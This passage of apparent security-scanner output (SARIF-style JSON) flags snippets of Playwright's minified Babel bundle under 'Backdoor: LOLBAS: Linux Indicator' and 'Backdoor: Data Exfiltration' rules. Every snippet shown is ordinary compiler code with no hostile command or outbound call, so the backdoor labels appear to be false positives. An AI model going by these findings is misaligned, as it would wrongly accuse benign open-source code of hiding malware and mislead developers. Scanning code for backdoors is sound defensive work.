                      "markdown": "`(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 154246,
                  "endLine": 8,
                  "endColumn": 154252,
                  "snippet": {
                    "text": "unction\")throw new Error(\"You passed `traverse()` a function when it expected a visitor object, are you sure you didn't mean `{ enter: Function }`?\");for(let t of Object.keys(e)){if((t===\"enter\"||t===\"exit\")&&GT(t,e[t]),Ys(t))continue;if(PH.indexOf(t)<0)throw new Error(`You gave us a visitor for the node type ${t} but it's not a valid type`);let r=e[t];if(typeof r==\"object\")for(let n of Object.keys(r))if(n===\"enter\"||n===\"exit\")GT(`${t}.${n}`,r[n]);else throw new Error(`You passed \\`traverse()\\` a visitor object with the property ${t} that has the invalid property ${n}`)}e._verified=!0}}function GT(",
                    "rendered": {
                      "text": "unction\")throw new Error(\"You passed `traverse()` a function when it expected a visitor object, are you sure you didn't mean `{ enter: Function }`?\");for(let t of Object.keys(e)){if((t===\"enter\"||t===\"exit\")&&GT(t,e[t]),Ys(t))continue;if(PH.indexOf(t)<0)throw new Error(`You gave us a visitor for the node type ${t} but it's not a valid type`);let r=e[t];if(typeof r==\"object\")for(let n of Object.keys(r))if(n===\"enter\"||n===\"exit\")GT(`${t}.${n}`,r[n]);else throw new Error(`You passed \\`traverse()\\` a visitor object with the property ${t} that has the invalid property ${n}`)}e._verified=!0}}function GT(",
                      "markdown": "`unction\")throw new Error(\"You passed `traverse()` a function when it expected a visitor object, are you sure you didn't mean `{ enter: Function }`?\");for(let t of Object.keys(e)){if((t===\"enter\"||t===\"exit\")&&GT(t,e[t]),Ys(t))continue;if(PH.indexOf(t)<0)throw new Error(`You gave us a visitor for the node type ${t} but it's not a valid type`);let r=e[t];if(typeof r==\"object\")for(let n of Object.keys(r))if(n===\"enter\"||n===\"exit\")GT(`${t}.${n}`,r[n]);else throw new Error(`You passed \\`traverse()\\` a visitor object with the property ${t} that has the invalid property ${n}`)}e._verified=!0}}function GT(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 133326,
                  "endLine": 8,
                  "endColumn": 133332,
                  "snippet": {
                    "text": "0]===\"_\"&&r!==\"__clone\"&&(e[r]=t[r]);for(let r of vT.INHERIT_KEYS.force)e[r]=t[r];return(0,aK.default)(e,t),e}});var ST=E(xh=>{\"use strict\";Object.defineProperty(xh,\"__esModule\",{value:!0});xh.default=cK;var lK=pr(),uK=De();function cK(e,t){if((0,uK.isSuper)(e.object))throw new Error(\"Cannot prepend node to super property access (`super.foo`).\");return e.object=(0,lK.memberExpression)(t,e.object),e}});var eo=E(Ah=>{\"use strict\";Object.defineProperty(Ah,\"__esModule\",{value:!0});Ah.default=Ph;var us=Mt();function Ph(e,t,r,n){let s=[].concat(e),i=Object.create(null);for(;s.length;){let a=s.shift();if(!",
                    "rendered": {
                      "text": "0]===\"_\"&&r!==\"__clone\"&&(e[r]=t[r]);for(let r of vT.INHERIT_KEYS.force)e[r]=t[r];return(0,aK.default)(e,t),e}});var ST=E(xh=>{\"use strict\";Object.defineProperty(xh,\"__esModule\",{value:!0});xh.default=cK;var lK=pr(),uK=De();function cK(e,t){if((0,uK.isSuper)(e.object))throw new Error(\"Cannot prepend node to super property access (`super.foo`).\");return e.object=(0,lK.memberExpression)(t,e.object),e}});var eo=E(Ah=>{\"use strict\";Object.defineProperty(Ah,\"__esModule\",{value:!0});Ah.default=Ph;var us=Mt();function Ph(e,t,r,n){let s=[].concat(e),i=Object.create(null);for(;s.length;){let a=s.shift();if(!",
                      "markdown": "`0]===\"_\"&&r!==\"__clone\"&&(e[r]=t[r]);for(let r of vT.INHERIT_KEYS.force)e[r]=t[r];return(0,aK.default)(e,t),e}});var ST=E(xh=>{\"use strict\";Object.defineProperty(xh,\"__esModule\",{value:!0});xh.default=cK;var lK=pr(),uK=De();function cK(e,t){if((0,uK.isSuper)(e.object))throw new Error(\"Cannot prepend node to super property access (`super.foo`).\");return e.object=(0,lK.memberExpression)(t,e.object),e}});var eo=E(Ah=>{\"use strict\";Object.defineProperty(Ah,\"__esModule\",{value:!0});Ah.default=Ph;var us=Mt();function Ph(e,t,r,n){let s=[].concat(e),i=Object.create(null);for(;s.length;){let a=s.shift();if(!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 121242,
                  "endLine": 8,
                  "endColumn": 121248,
                  "snippet": {
                    "text": "optional),Dn(e,\"typeAnnotation\")&&(i.typeAnnotation=t?tT(e.typeAnnotation,!0,r,n):e.typeAnnotation);else if(Dn(Qv.NODE_FIELDS,s))for(let a of Object.keys(Qv.NODE_FIELDS[s]))Dn(e,a)&&(t?i[a]=(0,Zv.isFile)(e)&&a===\"comments\"?Yl(e.comments,t,r,n):tT(e[a],!0,r,n):i[a]=e[a]);else throw new Error(`Unknown node type: \"${s}\"`);return Dn(e,\"loc\")&&(r?i.loc=null:i.loc=e.loc),Dn(e,\"leadingComments\")&&(i.leadingComments=Yl(e.leadingComments,t,r,n)),Dn(e,\"innerComments\")&&(i.innerComments=Yl(e.innerComments,t,r,n)),Dn(e,\"trailingComments\")&&(i.trailingComments=Yl(e.trailingComments,t,r,n)),Dn(e,\"extra\")&&(i.extr",
                    "rendered": {
                      "text": "optional),Dn(e,\"typeAnnotation\")&&(i.typeAnnotation=t?tT(e.typeAnnotation,!0,r,n):e.typeAnnotation);else if(Dn(Qv.NODE_FIELDS,s))for(let a of Object.keys(Qv.NODE_FIELDS[s]))Dn(e,a)&&(t?i[a]=(0,Zv.isFile)(e)&&a===\"comments\"?Yl(e.comments,t,r,n):tT(e[a],!0,r,n):i[a]=e[a]);else throw new Error(`Unknown node type: \"${s}\"`);return Dn(e,\"loc\")&&(r?i.loc=null:i.loc=e.loc),Dn(e,\"leadingComments\")&&(i.leadingComments=Yl(e.leadingComments,t,r,n)),Dn(e,\"innerComments\")&&(i.innerComments=Yl(e.innerComments,t,r,n)),Dn(e,\"trailingComments\")&&(i.trailingComments=Yl(e.trailingComments,t,r,n)),Dn(e,\"extra\")&&(i.extr",
                      "markdown": "`optional),Dn(e,\"typeAnnotation\")&&(i.typeAnnotation=t?tT(e.typeAnnotation,!0,r,n):e.typeAnnotation);else if(Dn(Qv.NODE_FIELDS,s))for(let a of Object.keys(Qv.NODE_FIELDS[s]))Dn(e,a)&&(t?i[a]=(0,Zv.isFile)(e)&&a===\"comments\"?Yl(e.comments,t,r,n):tT(e[a],!0,r,n):i[a]=e[a]);else throw new Error(`Unknown node type: \"${s}\"`);return Dn(e,\"loc\")&&(r?i.loc=null:i.loc=e.loc),Dn(e,\"leadingComments\")&&(i.leadingComments=Yl(e.leadingComments,t,r,n)),Dn(e,\"innerComments\")&&(i.innerComments=Yl(e.innerComments,t,r,n)),Dn(e,\"trailingComments\")&&(i.trailingComments=Yl(e.trailingComments,t,r,n)),Dn(e,\"extra\")&&(i.extr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 69090,
                  "endLine": 8,
                  "endColumn": 69096,
                  "snippet": {
                    "text": "f9=Fr();function p9(e){return!!(e&&f9.VISITOR_KEYS[e.type])}});var Rv=E(kd=>{\"use strict\";Object.defineProperty(kd,\"__esModule\",{value:!0});kd.default=h9;var d9=Nd();function h9(e){if(!(0,d9.default)(e)){var t;let r=(t=e==null?void 0:e.type)!=null?t:JSON.stringify(e);throw new TypeError(`Not a valid node of type \"${r}\"`)}}});var qv=E(S=>{\"use strict\";Object.defineProperty(S,\"__esModule\",{value:!0});S.assertAccessor=O$;S.assertAnyTypeAnnotation=J7;S.assertArgumentPlaceholder=AU;S.assertArrayExpression=y9;S.assertArrayPattern=h7;S.assertArrayTypeAnnotation=z7;S.assertArrowFunctionExpression=m7;S.asser",
                    "rendered": {
                      "text": "f9=Fr();function p9(e){return!!(e&&f9.VISITOR_KEYS[e.type])}});var Rv=E(kd=>{\"use strict\";Object.defineProperty(kd,\"__esModule\",{value:!0});kd.default=h9;var d9=Nd();function h9(e){if(!(0,d9.default)(e)){var t;let r=(t=e==null?void 0:e.type)!=null?t:JSON.stringify(e);throw new TypeError(`Not a valid node of type \"${r}\"`)}}});var qv=E(S=>{\"use strict\";Object.defineProperty(S,\"__esModule\",{value:!0});S.assertAccessor=O$;S.assertAnyTypeAnnotation=J7;S.assertArgumentPlaceholder=AU;S.assertArrayExpression=y9;S.assertArrayPattern=h7;S.assertArrayTypeAnnotation=z7;S.assertArrowFunctionExpression=m7;S.asser",
                      "markdown": "`f9=Fr();function p9(e){return!!(e&&f9.VISITOR_KEYS[e.type])}});var Rv=E(kd=>{\"use strict\";Object.defineProperty(kd,\"__esModule\",{value:!0});kd.default=h9;var d9=Nd();function h9(e){if(!(0,d9.default)(e)){var t;let r=(t=e==null?void 0:e.type)!=null?t:JSON.stringify(e);throw new TypeError(`Not a valid node of type \"${r}\"`)}}});var qv=E(S=>{\"use strict\";Object.defineProperty(S,\"__esModule\",{value:!0});S.assertAccessor=O$;S.assertAnyTypeAnnotation=J7;S.assertArgumentPlaceholder=AU;S.assertArrayExpression=y9;S.assertArrayPattern=h7;S.assertArrayTypeAnnotation=z7;S.assertArrowFunctionExpression=m7;S.asser`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 67857,
                  "endLine": 8,
                  "endColumn": 67863,
                  "snippet": {
                    "text": "NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=pr(),o9=De();function l9(e,t){let r=e.value.split(/\\r\\n|\\n|\\r/),n=0;for(let i=0;i<r.length;i++)r[i].match(/[^ \\t]/)&&(n=i);let s=\"\";for(let i=0;i<r.length;i++){let a=r[i],o=i===0,l=i===",
                    "rendered": {
                      "text": "NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=pr(),o9=De();function l9(e,t){let r=e.value.split(/\\r\\n|\\n|\\r/),n=0;for(let i=0;i<r.length;i++)r[i].match(/[^ \\t]/)&&(n=i);let s=\"\";for(let i=0;i<r.length;i++){let a=r[i],o=i===0,l=i===",
                      "markdown": "`NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=pr(),o9=De();function l9(e,t){let r=e.value.split(/\\r\\n|\\n|\\r/),n=0;for(let i=0;i<r.length;i++)r[i].match(/[^ \\t]/)&&(n=i);let s=\"\";for(let i=0;i<r.length;i++){let a=r[i],o=i===0,l=i===`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 67764,
                  "endLine": 8,
                  "endColumn": 67770,
                  "snippet": {
                    "text": "ameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=pr(),o9=De();function l9(e,t){let r=e.value.split(/\\r\\n|\\n|\\r/),n=0;for(let i=0;i<r.length;i",
                    "rendered": {
                      "text": "ameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=pr(),o9=De();function l9(e,t){let r=e.value.split(/\\r\\n|\\n|\\r/),n=0;for(let i=0;i<r.length;i",
                      "markdown": "`ameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=pr(),o9=De();function l9(e,t){let r=e.value.split(/\\r\\n|\\n|\\r/),n=0;for(let i=0;i<r.length;i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 67673,
                  "endLine": 8,
                  "endColumn": 67679,
                  "snippet": {
                    "text": "erDeclaration\",params:e})}function t9(e=null,t=null,r){return(0,B.default)({type:\"TSTypeParameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=p",
                    "rendered": {
                      "text": "erDeclaration\",params:e})}function t9(e=null,t=null,r){return(0,B.default)({type:\"TSTypeParameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=p",
                      "markdown": "`erDeclaration\",params:e})}function t9(e=null,t=null,r){return(0,B.default)({type:\"TSTypeParameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var Lv=E(Dd=>{\"use strict\";Object.defineProperty(Dd,\"__esModule\",{value:!0});Dd.default=l9;var a9=p`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 67577,
                  "endLine": 8,
                  "endColumn": 67583,
                  "snippet": {
                    "text": "TSTypeParameterInstantiation\",params:e})}function e9(e){return(0,B.default)({type:\"TSTypeParameterDeclaration\",params:e})}function t9(e=null,t=null,r){return(0,B.default)({type:\"TSTypeParameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var",
                    "rendered": {
                      "text": "TSTypeParameterInstantiation\",params:e})}function e9(e){return(0,B.default)({type:\"TSTypeParameterDeclaration\",params:e})}function t9(e=null,t=null,r){return(0,B.default)({type:\"TSTypeParameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var",
                      "markdown": "`TSTypeParameterInstantiation\",params:e})}function e9(e){return(0,B.default)({type:\"TSTypeParameterDeclaration\",params:e})}function t9(e=null,t=null,r){return(0,B.default)({type:\"TSTypeParameter\",constraint:e,default:t,name:r})}function r9(e){return(0,Gl.default)(\"NumberLiteral\",\"NumericLiteral\",\"The node type \"),kv(e)}function n9(e,t=\"\"){return(0,Gl.default)(\"RegexLiteral\",\"RegExpLiteral\",\"The node type \"),Bv(e,t)}function s9(e){return(0,Gl.default)(\"RestProperty\",\"RestElement\",\"The node type \"),Fv(e)}function i9(e){return(0,Gl.default)(\"SpreadProperty\",\"SpreadElement\",\"The node type \"),jv(e)}});var`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 5639,
                  "endLine": 5,
                  "endColumn": 5645,
                  "snippet": {
                    "text": "o be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeTypes=e,t}function u4(...e){function t(r,n,s){for(let i of e)if(Ml(s)===i||(0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expected node to be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeOrValueTypes=e,t}function bd(e){function t(r,n,s){if(!(Ml(s)===e))throw new TypeError(`Property ${n} expected type of ${e} but got ${Ml(s)}`)}return t.type=e,t}function c4(e){function t(",
                    "rendered": {
                      "text": "o be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeTypes=e,t}function u4(...e){function t(r,n,s){for(let i of e)if(Ml(s)===i||(0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expected node to be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeOrValueTypes=e,t}function bd(e){function t(r,n,s){if(!(Ml(s)===e))throw new TypeError(`Property ${n} expected type of ${e} but got ${Ml(s)}`)}return t.type=e,t}function c4(e){function t(",
                      "markdown": "`o be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeTypes=e,t}function u4(...e){function t(r,n,s){for(let i of e)if(Ml(s)===i||(0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expected node to be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeOrValueTypes=e,t}function bd(e){function t(r,n,s){if(!(Ml(s)===e))throw new TypeError(`Property ${n} expected type of ${e} but got ${Ml(s)}`)}return t.type=e,t}function c4(e){function t(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 5332,
                  "endLine": 5,
                  "endColumn": 5338,
                  "snippet": {
                    "text": "throw new TypeError(`Property ${n} expected value to be one of ${JSON.stringify(e)} but got ${JSON.stringify(s)}`)}return t.oneOf=e,t}function md(...e){function t(r,n,s){for(let i of e)if((0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expected node to be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeTypes=e,t}function u4(...e){function t(r,n,s){for(let i of e)if(Ml(s)===i||(0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expecte",
                    "rendered": {
                      "text": "throw new TypeError(`Property ${n} expected value to be one of ${JSON.stringify(e)} but got ${JSON.stringify(s)}`)}return t.oneOf=e,t}function md(...e){function t(r,n,s){for(let i of e)if((0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expected node to be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeTypes=e,t}function u4(...e){function t(r,n,s){for(let i of e)if(Ml(s)===i||(0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expecte",
                      "markdown": "`throw new TypeError(`Property ${n} expected value to be one of ${JSON.stringify(e)} but got ${JSON.stringify(s)}`)}return t.oneOf=e,t}function md(...e){function t(r,n,s){for(let i of e)if((0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expected node to be of a type ${JSON.stringify(e)} but instead got ${JSON.stringify(s==null?void 0:s.type)}`)}return t.oneOfNodeTypes=e,t}function u4(...e){function t(r,n,s){for(let i of e)if(Ml(s)===i||(0,lv.default)(i,s)){(0,Rl.validateChild)(r,n,s);return}throw new TypeError(`Property ${n} of ${r.type} expecte`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 20781,
                  "endLine": 2028,
                  "endColumn": 20786,
                  "snippet": {
                    "text": "oleanLiteral(re.length>1)),I(q,re.length>1?\"jsxs\":\"jsx\",Y)}function Te(j,q){if(!(l&&!l(j.node,q)))return I(q,\"createElement\",[rs(q,\"id/fragment\")(),z.types.nullLiteral(),...z.types.react.buildChildren(j.node)])}function Pe(j,q){let Y=j.get(\"openingElement\");return I(q,\"createElement\",[Be(Y),dt(q,j,Y.get(\"attributes\")),...z.types.react.buildChildren(j.node)])}function Be(j){let q=O(j.node.name,j.node),Y;return z.types.isIdentifier(q)?Y=q.name:z.types.isStringLiteral(q)&&(Y=q.value),z.types.react.isCompatTag(Y)?z.types.stringLiteral(Y):q}function dt(j,q,Y){let re=rs(j,\"runtime\");if(re!==\"automatic\"){",
                    "rendered": {
                      "text": "oleanLiteral(re.length>1)),I(q,re.length>1?\"jsxs\":\"jsx\",Y)}function Te(j,q){if(!(l&&!l(j.node,q)))return I(q,\"createElement\",[rs(q,\"id/fragment\")(),z.types.nullLiteral(),...z.types.react.buildChildren(j.node)])}function Pe(j,q){let Y=j.get(\"openingElement\");return I(q,\"createElement\",[Be(Y),dt(q,j,Y.get(\"attributes\")),...z.types.react.buildChildren(j.node)])}function Be(j){let q=O(j.node.name,j.node),Y;return z.types.isIdentifier(q)?Y=q.name:z.types.isStringLiteral(q)&&(Y=q.value),z.types.react.isCompatTag(Y)?z.types.stringLiteral(Y):q}function dt(j,q,Y){let re=rs(j,\"runtime\");if(re!==\"automatic\"){",
